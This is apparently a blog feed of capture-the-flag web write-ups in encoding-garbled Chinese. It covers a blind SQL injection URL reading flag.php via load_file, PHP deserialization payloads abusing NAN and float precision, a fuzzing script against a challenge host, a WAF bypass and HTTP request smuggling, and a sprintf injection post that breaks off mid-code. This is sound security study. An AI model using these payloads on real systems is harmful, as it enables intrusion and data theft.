class="hljs-string">&quot;http://812a2fb3-abaa-4b68-98b4-2bc2172d4509.node3.buuoj.cn/view.php?no=elt(ord(substr(load_file(%27/var/www/html/flag.php%27),&#123;&#125;,1))%3E&#123;&#125;,1)&quot;</span><span class="hljs-built_in">exp</span>(url,<span class="hljs-number">400</span>)</code></pre><p><strong>æ€»ç»“ï¼š</strong></p><ul><li>é€šè¿‡æ³¨å…¥å‘ç°dataçš„æ•°æ®æ˜¯åºåˆ—åŒ–çš„</li><li>ä»£ç å®¡è®¡å­˜åœ¨å¯åˆ©ç”¨çš„ssrfç‚¹</li><li>ç»“åˆååºåˆ—åŒ–å’Œssrfï¼Œä¿è¯bypasså¯ä»¥è¢«åˆ©ç”¨</li></ul><p>å‚è€ƒï¼š<a href="http://www.bubuko.com/infodetail-3603593.html">[ç½‘é¼æ¯ 2018]Fakebook(SSRF+è”åˆæ³¨å…¥ç»•Waf)</a></p><p><a href="https://www.cnblogs.com/kevinbruce656/p/12643338.html">fakebooké¢˜è§£</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2020</title>
    <link href="/2021/04/15/easytrick/"/>
    <url>/2021/04/15/easytrick/</url>
    
    <content type="html"><![CDATA[<p>è¿™é¢˜çš„åˆ©ç”¨ç‚¹ä¹‹å‰æ²¡é‡åˆ°è¿‡ï¼Œæ¯”è¾ƒæœ‰æ„æ€ã€‚</p><h2 id="easytrick"><a class="header-anchor" href="#easytrick">ğŸ­</a>easytrick</h2><p>ä»£ç ï¼š</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">trick</span></span>&#123;    <span class="hljs-keyword">public</span> $trick1;    <span class="hljs-keyword">public</span> $trick2;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;trick1 = (<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;trick1;        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;trick1) &gt; <span class="hljs-number">5</span> || strlen(<span class="hljs-keyword">$this</span>-&gt;trick2) &gt; <span class="hljs-number">5</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ å¤ªé•¿äº†&quot;</span>);        &#125;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;trick1 !== <span class="hljs-keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="hljs-keyword">$this</span>-&gt;trick1) === md5(<span class="hljs-keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;trick1 != <span class="hljs-keyword">$this</span>-&gt;trick2)&#123;            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);        &#125;    &#125;&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);unserialize($_GET[<span class="hljs-string">&#x27;trick&#x27;</span>]);</code></pre><p><code>trick1</code> è¢«å¼ºåˆ¶è½¬æˆäº†<code>string</code>ç±»å‹,å› ä¸ºä¸‹é¢çš„<code>md5($this-&gt;trick1) === md5($this-&gt;trick2)</code>ï¼Œè™½ç„¶æ˜¯<code>===</code>ï¼Œä½†md5å‡½æ•°åœ¨å¤„ç†æ•°ç»„æ—¶æœ‰ç¼ºé™·é»˜è®¤æ•°ç»„ä¸º<code>0</code>ï¼Œæ‰€ä»¥è¿™é‡Œæ‰è¦å¼ºåˆ¶è½¬æ¢ä¸‹ç±»å‹ã€‚</p><pre><code class="hljs bash">== å’Œ != æ¯”è¾ƒå¦‚æœç±»å‹ä¸åŒï¼Œå…ˆå¿è¯•è½¬æ¢ç±»å‹ï¼Œå†ä½œå€¼æ¯”è¾ƒï¼Œæœ€åè¿”å›å€¼æ¯”è¾ƒç»“æœ=== å’Œ !== åªæœ‰åœ¨ç›¸åŒç±»å‹ä¸‹,æ‰ä¼šæ¯”è¾ƒå…¶å€¼</code></pre><p>è¿™é¢˜æœ¬æ¥å¯ä»¥ç”¨MD5åç›¸åŒå­—ç¬¦è¿›è¡ŒMD5ç¢°æ’çš„ï¼Œä½†è¿™é‡Œå­˜åœ¨é•¿åº¦é™åˆ¶ï¼Œæ•…è¦æ¢ä¸ªæ€è·¯ã€‚</p><h4 id="æ³•ä¸€ï¼š"><a class="header-anchor" href="#æ³•ä¸€ï¼š">ğŸ­</a>æ³•ä¸€ï¼š</h4><blockquote><p>tipsï¼š<br>INFåœ¨PHPä¸­ä»£è¡¨çš„æ˜¯æ— ç©·å¤§çš„æ„æ€<br>NaNå¸¸åœ¨æµ®ç‚¹æ•°è¿ç®—ä¸­ä½¿ç”¨</p></blockquote><p>payload:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">trick</span></span>&#123;    <span class="hljs-keyword">public</span> $trick1;    <span class="hljs-keyword">public</span> $trick2;&#125;$tr = <span class="hljs-keyword">new</span> trick();$tr-&gt;trick1 = NAN;$tr-&gt;trick2 = NAN;<span class="hljs-keyword">echo</span> serialize($tr);</code></pre><p>NANä»£è¡¨éæ•°å€¼çš„ç‰¹æ®Šå€¼ï¼Œç”¨äºæŒ‡ç¤ºæŸä¸ªå€¼ä¸æ˜¯æ•°å­—,ä¸”ä¸å…¶ä»–æ•°å€¼è¿›è¡Œæ¯”è¾ƒçš„ç»“æœæ€»æ˜¯ä¸ç›¸ç­‰çš„ï¼ŒåŒ…æ‹¬è‡ªèº«åœ¨å†…ï¼ŒåŒç±»å‹å¯è§:<a href="https://blog.csdn.net/chunyexiyu/article/details/39179735">ä¸è‡ªèº«ä¸ç­‰çš„æµ®ç‚¹æ•°ç±»å‹</a></p><h4 id="æ³•äºŒï¼š"><a class="header-anchor" href="#æ³•äºŒï¼š">ğŸ­</a>æ³•äºŒï¼š</h4><p>è¿™é“é¢˜æ˜¯è€ƒå¯Ÿ<strong>æµ®ç‚¹æ•°ç²¾åº¦é—®é¢˜å¯¼è‡´çš„å¤§å°æ¯”è¾ƒä»¥åŠå‡½æ•°å¤„ç†é—®é¢˜</strong>ï¼Œå½“å°æ•°å°äº<code>10^-16</code>åï¼ŒPHPå¯¹äºå°æ•°å°±å¤§å°ä¸åˆ†äº†</p><pre><code class="hljs apache"><span class="hljs-attribute">var_dump</span>(<span class="hljs-number">1</span>.<span class="hljs-number">000000000000000</span> == <span class="hljs-number">1</span>) &gt;&gt; TRUE<span class="hljs-attribute">var_dump</span>(<span class="hljs-number">1</span>.<span class="hljs-number">0000000000000001</span> == <span class="hljs-number">1</span>) &gt;&gt; TRUE<span class="hljs-attribute">strlen</span>(<span class="hljs-number">0</span>.<span class="hljs-number">9999999999999999</span>)=<span class="hljs-number">1</span>//ï¼ˆ<span class="hljs-number">17</span>ä¸ª<span class="hljs-number">9</span>ï¼‰[åœ¨!==å’Œ!=ä¸‹å‡æˆç«‹]</code></pre><p>md5å‡½æ•°å¤„ç†åç›¸åŒ</p><p><img src="/2021/04/15/easytrick/1.png" alt="1"></p><table><thead><tr><th>å€¼èŒƒå›´</th><th>ä¸0.1æ˜¯å¦ç›¸ç­‰</th><th>ä¸0.1çš„md5å€¼æ˜¯å¦ç›¸ç­‰</th></tr></thead><tbody><tr><td>0.1 åˆ° 0.10000000000001</td><td>å¦</td><td>å¦</td></tr><tr><td>0.100000000000001 åˆ° 0.100000000000001</td><td>å¦</td><td>æ˜¯</td></tr><tr><td>0.1000000000000001 åˆ° 0.00000000000000â€¦1</td><td>æ˜¯</td><td>æ˜¯</td></tr></tbody></table><p>payload:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">trick</span></span>&#123;    <span class="hljs-keyword">public</span> $trick1 ;    <span class="hljs-keyword">public</span> $trick2 ;&#125;$shy = <span class="hljs-keyword">new</span> trick();$shy-&gt;trick1 = <span class="hljs-number">1</span>;$shy-&gt;trick2 = <span class="hljs-number">0.9999999999999999</span>;<span class="hljs-keyword">echo</span> urlencode(serialize($a));</code></pre><p>trick1çš„å€¼å¿…é¡»ä¸º1ï¼Œå› ä¸º$this-&gt;trick1 = (string)$this-&gt;trick1;æœ‰è¿™ä¸ªè¯­å¥çš„é™åˆ¶ï¼Œå¦‚æœä¸º0.9999999999999999ï¼Œåˆ™æµ®ç‚¹æ•°å°±å˜æˆäº†å­—ç¬¦ç±»å‹å°±ä¸ä¼šäº§ç”Ÿä¸Šé¢çš„æµ®ç‚¹æ•°ç²¾åº¦é—®é¢˜ã€‚</p><h2 id="easyphp"><a class="header-anchor" href="#easyphp">ğŸ­</a>easyphp</h2><p>é¢˜ç›®æºç ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-comment">//é¢˜ç›®ç¯å¢ƒï¼šphp:7.4.8-apache</span>    $pid = pcntl_fork();<span class="hljs-comment">//çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹éƒ½ä¼šæ‰§è¡Œä¸‹é¢ä»£ç </span>    <span class="hljs-keyword">if</span> ($pid == <span class="hljs-number">-1</span>) &#123;<span class="hljs-comment">//é”™è¯¯å¤„ç†ï¼šåˆ›å»ºå­è¿›ç¨‹å¤±è´¥æ—¶è¿”å›-1.</span>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;could not fork&#x27;</span>);    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($pid)&#123;<span class="hljs-comment">//çˆ¶è¿›ç¨‹ä¼šå¾—åˆ°å­è¿›ç¨‹å·ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯çˆ¶è¿›ç¨‹æ‰§è¡Œçš„é€»è¾‘</span>        $r=pcntl_wait($status);<span class="hljs-comment">//ç­‰å¾…å­è¿›ç¨‹ä¸­æ–­ï¼Œé˜²æ­¢å­è¿›ç¨‹æˆä¸ºåƒµå°¸è¿›ç¨‹ã€‚</span>        <span class="hljs-keyword">if</span>(!pcntl_wifexited($status))&#123;            phpinfo();        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//å­è¿›ç¨‹å¾—åˆ°çš„$pidä¸º0, æ‰€ä»¥è¿™é‡Œæ˜¯å­è¿›ç¨‹æ‰§è¡Œçš„é€»è¾‘ã€‚</span>        highlight_file(<span class="hljs-keyword">__FILE__</span>);        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;a&#x27;</span>])&amp;&amp;is_string($_GET[<span class="hljs-string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="hljs-string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,$_GET[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;            call_user_func_array($_GET[<span class="hljs-string">&#x27;a&#x27;</span>],[$_GET[<span class="hljs-string">&#x27;b&#x27;</span>],<span class="hljs-literal">false</span>,<span class="hljs-literal">true</span>]);        &#125;        posix_kill(posix_getpid(), SIGUSR1);    &#125;</code></pre><blockquote><p>pcntl_fork()</p><blockquote><p>æ˜¯php-pcntlæ¨¡å—ä¸­ç”¨äºåˆ›å»ºè¿›ç¨‹çš„å‡½æ•°ï¼Œåˆ›å»ºå­è¿›ç¨‹æˆåŠŸåï¼Œåœ¨çˆ¶è¿›ç¨‹å†…ï¼Œè¿”å›å­è¿›ç¨‹å·ï¼Œåœ¨å­è¿›ç¨‹å†…è¿”å›0ï¼Œå¤±è´¥åˆ™è¿”å›-1</p></blockquote></blockquote><blockquote><p>pcntl_wait</p><blockquote><p>ç­‰å¾…æˆ–è¿”å›forkçš„å­è¿›ç¨‹çŠ¶æ€</p></blockquote></blockquote><blockquote><p>pcntl_wifexited</p><blockquote><p>æ£€æŸ¥çŠ¶æ€ä»£ç æ˜¯å¦ä»£è¡¨ä¸€ä¸ªæ­£å¸¸çš„é€€å‡º</p></blockquote></blockquote><blockquote><p>call_user_func_array ( callable $callback , array $param_arr )</p><blockquote><p>æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„ä½œï¼ˆparam_arrï¼‰ä¸ºå›è°ƒå‡½æ•°çš„çš„å‚æ•°ä¼ å…¥ã€‚</p></blockquote></blockquote><p>å› ä¸º<code>pcntl_wait</code> <strong>çˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹é€€å‡ºæ‰ä¼šæ‰§è¡Œä¸‹é¢</strong>ï¼Œæˆ‘ä»¬éœ€è¦è®©<strong>å­è¿›ç¨‹ä¸æ­£å¸¸é€€å‡º</strong>ï¼Œä»è€Œæ‰§è¡Œçˆ¶è¿›ç¨‹ï¼Œè·å–åˆ°phpinfo()ã€‚å¯ä»¥å†™ä¸ªæ‰€æœ‰å‡½æ•°åçš„å­—å…¸,åˆ©ç”¨è„šæœ¬fuzzã€‚</p><p>è·å–phpå†…ç½®å‡½æ•°å</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//é¢˜ç›®ç¯å¢ƒï¼šphp:7.4.8-apache</span>$result = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">foreach</span> (get_defined_functions() <span class="hljs-keyword">as</span> $key =&gt; $val)&#123;    <span class="hljs-keyword">if</span> ($key == <span class="hljs-string">&#x27;internal&#x27;</span>)&#123;        <span class="hljs-keyword">foreach</span> ($val <span class="hljs-keyword">as</span> $k=&gt;$v)&#123;            $result = $result.$v.<span class="hljs-string">&quot; &quot;</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">echo</span> $result;<span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">&quot;func_name.txt&quot;</span>))&#123;    unlink(<span class="hljs-string">&quot;func_name.txt&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;    file_put_contents(<span class="hljs-string">&quot;func_name.txt&quot;</span>,$result);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>å‘åŒ…è„šæœ¬</p><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><span class="hljs-keyword">import</span> requestss = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">zend_version func_num_args â€¦â€¦â€¦â€¦â€¦â€¦ï¼ˆå†…ç½®å‡½æ•°ï¼‰ xdebug_get_headers dl cli_set_process_title cli_get_process_title </span><span class="hljs-string"></span><span class="hljs-string">&#x27;&#x27;&#x27;</span>s = s.split(<span class="hljs-string">&#x27; &#x27;</span>)<span class="hljs-comment"># print s[0]</span><span class="hljs-comment"># print s</span><span class="hljs-comment"># con = requests.get(&#x27;http://eci-2zed3ztpomt9jfpdablo.cloudeci1.ichunqiu.com/?a=call_user_func&amp;b=&#x27;+s[0]).text</span><span class="hljs-comment"># print con</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:    con = requests.get(<span class="hljs-string">&#x27;http://eci-2zed3ztpomt9k9atz5n9.cloudeci1.ichunqiu.com/?a=&#x27;</span>+i).text    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> con:        <span class="hljs-comment"># if con != nothing:</span>        <span class="hljs-keyword">print</span> i        <span class="hljs-keyword">print</span> con.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF | [RoarCTF 2019]Easy Calc</title>
    <link href="/2021/04/13/buu/"/>
    <url>/2021/04/13/buu/</url>
    
    <content type="html"><![CDATA[<p>æ„Ÿè§‰è¿™é“é¢˜ç›®æœ‰ç‚¹æ„æ€</p><p>æ‰“å¼€ç½‘é¡µæ˜¯ä¸ªè®¡ç®—æœºï¼ŒæŸ¥æºç </p><p><img src="/2021/04/13/buu/2.jpg" alt="2"></p><h3 id="æ³•ä¸€ï¼šåˆ©ç”¨ç‰¹æ€§"><a class="header-anchor" href="#æ³•ä¸€ï¼šåˆ©ç”¨ç‰¹æ€§">ğŸ­</a>æ³•ä¸€ï¼šåˆ©ç”¨ç‰¹æ€§</h3><p>æç¤ºæœ‰wafï¼Œå…ˆæµ‹è¯•ä¸€ä¸‹è¯»ç›®å½•</p><p><img src="/2021/04/13/buu/3.jpg" alt="3"></p><p>è¢«banäº†ï¼Œåº”è¯¥è·Ÿwafæœ‰å…³ï¼Œè¿™é‡Œè¦åˆ©ç”¨ä¸€ä¸ªä¹‹å‰æ²¡æ³¨æ„è¿‡çš„ç‚¹ï¼š</p><h4 id="PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§"><a class="header-anchor" href="#PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§">ğŸ­</a>PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</h4><p>PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š1.åˆ é™¤ç©ºç™½ç¬¦ 2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰</p><p>æˆ‘ä»¬å¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼Œè¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·ä»£ç èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚æ„é€ ä¸€ä¸ªç©ºæ ¼å³å¯æŸ¥ç›®å½•,ä½†æ˜¯<code>/</code>è¿‡æ»¤æ‰ï¼Œæ­¤æ—¶å¯ç”¨char()è½¬asciiå†è¿›è¡Œæ‹¼æ¥</p><p><img src="/2021/04/13/buu/1.jpg" alt="1"></p><p>æŸ¥åˆ°flagæ‰€åœ¨çš„æ–‡ä»¶åï¼Œåˆ—å‡ºflag</p><p><img src="/2021/04/13/buu/4.jpg" alt="4"></p><h3 id="æ³•äºŒ-HTTPèµ°ç§"><a class="header-anchor" href="#æ³•äºŒ-HTTPèµ°ç§">ğŸ­</a>æ³•äºŒ:HTTPèµ°ç§</h3><p>å…¶å®ç”¨postæ¨¡å¼å‘ä¸€ä¸ªè¯·æ±‚ï¼Œå°±å‡ºç°æºç </p><p><img src="/2021/04/13/buu/5.jpg" alt="5"></p><blockquote><p>httpèµ°ç§</p><blockquote><p>å½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºä¸¤è€…æœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†ï¼Œå°±ç®—æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¯¥éƒ¨åˆ†å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆäº†å½±å“ä¹‹åï¼Œå°±å®ç°äº†HTTPèµ°ç§æ”»å‡»ã€‚</p><p><img src="/2021/04/13/buu/6.jpg" alt="6"></p><p>è¯¦è§ï¼š<a href="https://portswigger.net/web-security/request-smuggling">HTTP request smuggling</a></p></blockquote></blockquote><p>æ·»åŠ <code>Transfer-Encoding: chunked</code>ï¼Œåœ¨æ¶ˆæ¯ä½“åŠ å‡ ä¸ªå›è½¦</p><blockquote><p>åˆ†å—ä¼ è¾“ç¼–ç ï¼ˆChunked transfer encodingï¼‰æ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ˆHTTPï¼‰ä¸­çš„ä¸€ç§æ•°æ®ä¼ è¾“æœºåˆ¶ï¼Œå…è®¸HTTPç”±ç½‘é¡µæœåŠ¡å™¨å‘é€ç»™å®¢æˆ·ç«¯çš„æ•°æ®å¯ä»¥åˆ†æˆå¤šä¸ªéƒ¨åˆ†ã€‚åˆ†å—ä¼ è¾“ç¼–ç åªåœ¨HTTPåè®®1.1ç‰ˆæœ¬ï¼ˆHTTP/1.1ï¼‰ä¸­æä¾›</p></blockquote><p>è¿™é‡Œç”¨åˆ°çš„æ˜¯CL-TEï¼š</p><blockquote><p>æ‰€è°“<code>CL-TE</code>ï¼Œå°±æ˜¯å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯ä»£ç†æœåŠ¡å™¨åªå¤„ç†<code>Content-Length</code>è¿™ä¸€è¯·æ±‚å¤´ã€‚åç«¯æœåŠ¡å™¨ä¼šéµå®ˆ<code>RFC2616</code>çš„è§„å®šï¼Œå¿½ç•¥æ‰<code>Content-Length</code>ï¼Œå¤„ç†<code>Transfer-Encoding</code>è¿™ä¸€è¯·æ±‚å¤´ã€‚</p><p><img src="/2021/04/13/buu/7.jpg" alt="7"></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>åˆ·é¢˜</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sprintfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</title>
    <link href="/2021/04/10/wei6/"/>
    <url>/2021/04/10/wei6/</url>
    
    <content type="html"><![CDATA[<h4 id="sprintf"><a class="header-anchor" href="#sprintf">ğŸ­</a>sprintf()</h4><p>æŠŠæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²å†™å…¥å˜é‡ä¸­ã€‚</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sprintf</span><span class="hljs-params">(format,arg1,arg2,arg++)</span></span></code></pre><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>format</em></td><td>è§„å®šå­—ç¬¦ä¸²ä»¥åŠå¦‚ä½•æ ¼å¼åŒ–å…¶ä¸­çš„å˜é‡ã€‚                                                                            å¯èƒ½çš„æ ¼å¼å€¼ï¼š                                                                                                                           %% - è¿”å›ä¸€ä¸ªç™¾åˆ†å·                                                                                                            % %b - äºŒè¿›åˆ¶æ•°                                                                                                                               %c - ASCII å€¼å¯¹åº”çš„å­—ç¬¦                                                                                                                         %d - åŒ…å«æ­£è´Ÿå·çš„åè¿›åˆ¶æ•°ï¼ˆè´Ÿæ•°ã€0ã€æ­£æ•°ï¼‰                                                                                      %e - ä½¿ç”¨å°å†™çš„ç§‘å­¦è®¡æ•°æ³•ï¼ˆä¾‹å¦‚ 1.2e+2ï¼‰                                                                                          %E - ä½¿ç”¨å¤§å†™çš„ç§‘å­¦è®¡æ•°æ³•ï¼ˆä¾‹å¦‚ 1.2E+2ï¼‰                                                                                        %u - ä¸åŒ…å«æ­£è´Ÿå·çš„åè¿›åˆ¶æ•°ï¼ˆå¤§äºç­‰äº 0ï¼‰                                                                                      %f - æµ®ç‚¹æ•°ï¼ˆæœ¬åœ°è®¾ç½®ï¼‰                                                                                                                           %F - æµ®ç‚¹æ•°ï¼ˆéæœ¬åœ°è®¾ç½®ï¼‰                                                                                                                  %g - è¾ƒçŸ­çš„ %e å’Œ %f                                                                                                                            %G - è¾ƒçŸ­çš„ %E å’Œ %f                                                                                                                              %o - å…«è¿›åˆ¶æ•°                                                                                                                                            %s - å­—ç¬¦ä¸²                                                                                                                                               %x - åå…­è¿›åˆ¶æ•°ï¼ˆå°å†™å­—æ¯ï¼‰                                                                                            %X - åå…­è¿›åˆ¶æ•°ï¼ˆå¤§å†™å­—æ¯ï¼‰                                                                                                                                        é™„åŠ çš„æ ¼å¼å€¼ã€‚å¿…éœ€æ”¾ç½®åœ¨ % å’Œå­—æ¯ä¹‹é—´ï¼ˆä¾‹å¦‚ %.2fï¼‰ï¼š                                                                                 + ï¼ˆåœ¨æ•°å­—å‰é¢åŠ ä¸Š + æˆ– - æ¥å®šä¹‰æ•°å­—çš„æ­£è´Ÿæ€§ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰è´Ÿæ•°æ‰åšæ ‡è®°ï¼Œæ­£æ•°ä¸åšæ ‡è®°ï¼‰                                                                                                                                          â€™ ï¼ˆè§„å®šä½¿ç”¨ä»€ä¹ˆä½œä¸ºå¡«å……ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼ã€‚å®ƒå¿…é¡»ä¸å®½åº¦æŒ‡å®šå™¨ä¸€èµ·ä½¿ç”¨ã€‚ä¾‹å¦‚ï¼š%'x20sï¼ˆä½¿ç”¨ â€œxâ€ ä½œä¸ºå¡«å……ï¼‰ï¼‰                                                                                                                  - ï¼ˆå·¦è°ƒæ•´å˜é‡å€¼ï¼‰                                                                                                                                          [0-9] ï¼ˆè§„å®šå˜é‡å€¼çš„æœ€å°å®½åº¦ï¼‰                                                                                                                  .[0-9] ï¼ˆè§„å®šå°æ•°ä½æ•°æˆ–æœ€å¤§å­—ç¬¦ä¸²é•¿åº¦ï¼‰                                                                                                    æ³¨é‡Šï¼šå¦‚æœä½¿ç”¨å¤šä¸ªä¸Šè¿°çš„æ ¼å¼å€¼ï¼Œå®ƒä»¬å¿…é¡»æŒ‰ç…§ä»¥ä¸Šé¡ºåºä½¿ç”¨ã€‚</td></tr><tr><td><em>arg1</em>ã€<em>arg2</em>ã€<em>++</em></td><td>å°†è¢«æ’å…¥åˆ°ä¸»å­—ç¬¦ä¸²ä¸­çš„ç™¾åˆ†å·ï¼ˆ%ï¼‰ç¬¦å·å¤„ã€‚è¯¥å‡½æ•°æ˜¯é€æ­¥æ‰§è¡Œçš„ã€‚åœ¨ç¬¬ä¸€ä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ <em>arg1</em>ï¼Œåœ¨ç¬¬äºŒä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ <em>arg2</em>ï¼Œä¾æ­¤ç±»æ¨ã€‚</td></tr></tbody></table><p>æ³¨é‡Šï¼šå¦‚æœ % ç¬¦å·å¤šäº <em>arg</em> å‚æ•°ï¼Œåˆ™æ‚¨å¿…é¡»ä½¿ç”¨å ä½ç¬¦ã€‚å ä½ç¬¦ä½äº % ç¬¦å·ä¹‹åï¼Œç”±æ•°å­—å’Œ â€œ$â€ ç»„æˆ</p><h4 id="ä¸¾ä¸ªæ —å­"><a class="header-anchor" href="#ä¸¾ä¸ªæ —å­">ğŸ­</a>ä¸¾ä¸ªæ —å­</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$num1 = <span class="hljs-number">123456789</span>;$num2 = <span class="hljs-number">-123456789</span>;$char = <span class="hljs-number">50</span>;<span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%b = %b&quot;</span>,$num1).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// äºŒè¿›åˆ¶æ•°</span><span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%c = %c&quot;</span>,$char).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// ASCII å­—ç¬¦</span><span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%s = %s&quot;</span>,$num1).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// å­—ç¬¦ä¸²</span><span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%x = %x&quot;</span>,$num1).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// åå…­è¿›åˆ¶æ•°ï¼ˆå°å†™ï¼‰</span><span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%X = %X&quot;</span>,$num1).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// åå…­è¿›åˆ¶æ•°ï¼ˆå¤§å†™ï¼‰</span><span class="hljs-meta">?&gt;</span>ç»“æœï¼š%b = <span class="hljs-number">111010110111100110100010101</span>%c = <span class="hljs-number">2</span> %s = <span class="hljs-number">123456789</span>%x = <span class="hljs-number">75</span>bcd15%X = <span class="hljs-number">75</span>BCD15</code></pre><h3 id="sprintfæ³¨å…¥åŸç†"><a class="header-anchor" href="#sprintfæ³¨å…¥åŸç†">ğŸ­</a><strong>sprintfæ³¨å…¥åŸç†</strong></h3><p>sprintf()çš„åº•å±‚å®ç°æ–¹æ³•ï¼š</p><pre><code>switch (format[inpos]) &#123;case 's':    &#123;        zend_string * t;        zend_string * str = zval_get_tmp_string(tmp, &amp;t);        php_sprintf_appendstring( &amp; result, &amp;outpos, ZSTR_VAL(str), width, precision, padding, alignment, ZSTR_LEN(str), 0, 